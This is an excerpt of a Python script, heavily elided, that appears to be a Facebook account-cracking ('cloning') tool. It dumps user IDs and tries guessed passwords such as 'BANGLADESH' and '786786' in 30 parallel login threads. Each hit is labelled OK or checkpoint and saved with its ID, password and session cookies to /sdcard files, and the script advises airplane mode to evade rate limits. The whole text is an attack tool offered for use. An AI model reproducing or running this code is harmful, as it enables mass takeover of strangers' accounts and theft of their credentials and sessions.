...
#Chnge Name 
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mMAHIR-TAHSAN]')
...
def menu(my_name,my_id):
	...
	cetak(nel('\tWELCOME [green]%s[purple] TO MY PUBLIC TOOL'%(my_name)))
	alvino_xy(f'{u}YOUR ID  : '+str(my_id))
	alvino_xy(f'{h}YOUR IP  : {ip}')
	...
	if _____cowok__pink_____ in ['1']:
		...
		print('=>DONE  ')
		exit()
	elif _____cowok__pink_____ in ['44']:
		crack_file()
...
def dump_massal():
	try:
		...
		exit()
	try:
		print('=>NOTE : MAXIMUM ID LIMIT IS 20')
		jum = int(input('=>ENTER ID LIMIT : '))
	except ValueError:
		print('{k}=>ID WAS NOT SELECTED ')
		exit()
	if jum<1 or jum>20:
		print('=> ')
		exit()
	...
	for userr in uid:
		try:
			...
			print('{k}=>SOMETHING WENT WRONG...TRY AGAIN ')
			exit()
	try:
		print('')
		...
		print(f'➥=>{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LNK {u}')
		time.sleep(3)
		back()
#-------------[ Id -Crackiing]---------------#
def setting():
	...
	print('') 
	cetak(nel('[bold yellow] 1. CLONE OLD IDZ \n 2. CLONE NEW IDZ(RECOMMENDED)\n 3. CLONE MIX ID(BEST) [bold yellow]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ['1','01']:
	...
	print('') 
	cetak(nel('[bold purple] 1. MOBILE (RECOMMENDED)\n 2. MBASIC\n 3. FREE\n 4. TOUCH [bold purple]')) 
	print('')
	hc = input('>> CHOOSE : ')
	if hc in ['1','01']:
...
#   elif _jembot_ in ['y','Y']:
	...
	#else:
		#taplikasi.append('no')
	pwplus=input('=>PASWORD MENU MANUAL/DEFAULT(AUTO)( m/d ) ')
	if pwplus in ['m','M']:
		pwpluss.append('ya')
		cetak(nel('[[purple]•[yellow]] ADD PASSWORD MAXIMUM 6 WORDS\n[[purple]•[yellow]] EXAMPLE :[green] BANGLADESH,786786,2020[purple] '))
...
def passwrd():
	...
	banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(nel('\t[green]	ENJOY MY PUBLIC TOOL'))
	print('')
	cetak(nel('[bold cyan]                START CRACKING[•][bold cyan]')) 
	print(f'                    {m}M {k}A {h}H {u}I {b}R {u}')
	print('')
	print(f'{h}=>{h}RESULTS {h}OK{h} CHECK : {h}OK/%s {h}'%(okc))
	print(f'{u}=>{u}RESULTS {u}CP{u} CHECK : {u}CP/%s {u}'%(cpc))
	print(f'=>TURN AIRPLANE MODE AFTER CLONE ABOVE 1K IDZ\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[purple]=>[green] CRACK COMPLETE[purple] <<[yellow] '))
	print(f'[{h}•{u}]{h} OK : {h}%s '%(ok))
	print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
	print('{k}=>Main menu ( Y/t ) ? ')
	woi = input('=>Choose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}=>{k} THANKS FOR USING MY TOOL{u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}DOD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ OPSS! CHECKPOINT 😪 [red]'))
				...
				cetak(nel('[green]      🖤✌️ DOD-OK 🤍[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      😭DOD-IS-HERE🤣[purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='DOD-CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='DOD-OK'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='DOD-XD CP'))
					open('/sdcard/DOD-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/DOD-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
...
def ceker(idf,pw):
	...
	try:
		...
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Ceck Login at Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Cannot check option(Ceck Login at Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
